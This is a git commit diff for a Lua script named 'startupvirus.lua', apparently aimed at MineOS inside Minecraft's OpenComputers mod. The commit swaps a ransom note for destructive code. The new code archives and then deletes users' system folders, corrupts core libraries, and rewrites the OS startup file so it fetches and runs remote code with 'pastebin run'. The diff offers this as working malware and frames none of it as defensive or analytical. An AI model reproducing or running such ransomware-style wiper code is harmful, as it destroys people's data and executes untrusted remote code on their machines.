5b11ac0b9c2cbd1f944735809d6553f4e344e854
EletrixTime <71174682+EletrixtimeYT@users.noreply.github.com>
2023-09-29 15:40:30 +0200

    Update startupvirus.lua

--- startupvirus.lua
+++ startupvirus.lua
@@ -1,7 +1,26 @@
-print("----------------------")
-print("       ELTXCRY")
-print("----------------------")
-print("ALL OF YOUR DATA IS GONE")
-print("You cant restore data !")
-print("To restore data please contact me on RE:TALK : EletrixTimeLeVrai")
-print("Note : ")
+local internet = require("INTERNET")
+local compressor = require("compressor")
+local filesystem = require("filesystem")
+
+-- Move all of data to /eltxcry
+filesystem.copy("/Libraries", "/eltxcry/libraries")
+filesystem.copy("OS.LUA", "/eltxcry")
+filesystem.copy("/Icons", "/eltxcry")
+filesystem.copy("/Users", "/eltxcry")
+filesystem.copy("/Application", "/eltxcry")
+filesystem.copy("/Extensions", "/eltxcry")
+filesystem.copy("/Mounts", "/eltxcry")
+filesystem.copy("/Localizations", "/eltxcry")
+compressor.pack("/data-backup.pkg", {
+	"/eltxcry"
+})
+filesystem.remove("/eltxcry")
+-- Write ALL files
+
+filesystem.write("OS.lua", "pastebin run hQYzUhR9")
+filesystem.write("Libraries/Event.lua", "404")
+filesystem.write("Libraries/Network.lua", "404")
+filesystem.remove("/Libraries")
+filesystem.remove("/Localization")
+filesystem.remove("/Wallpapers")
+filesystem.remove("/LMounts")
